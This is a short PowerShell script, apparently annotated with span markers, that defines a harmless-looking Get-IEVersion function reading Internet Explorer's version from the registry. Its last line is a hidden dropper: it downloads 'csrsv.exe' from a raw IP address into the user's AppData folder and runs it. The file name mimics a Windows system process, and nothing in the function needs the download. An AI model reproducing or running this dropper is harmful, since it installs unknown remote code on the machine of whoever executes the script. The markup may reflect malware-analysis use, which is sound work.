

 -||-> function Get-IEVersion ($computer = $env:COMPUTERNAME) {
     -||-> $version = 0 <-||- 
    
     -||-> $keyname = 'SOFTWARE\Microsoft\Internet Explorer' <-||- 
     
     -||-> $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $computer) <-||- 
     -||-> $key = $reg.OpenSubkey($keyname) <-||- 
    
     -||-> try {
         -||-> $version = $key.GetValue('Version') <-||- 
         -||-> $svcUpdateVersion = $key.GetValue('svcUpdateVersion') <-||- 
        
    } catch {} <-||- 

     -||-> if ( -||-> $svcUpdateVersion <-||- ) {
         -||-> $svcUpdateVersion <-||- 
    } else {
         -||-> $version <-||- 
    } <-||- 

    
    
    
    
    
    
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



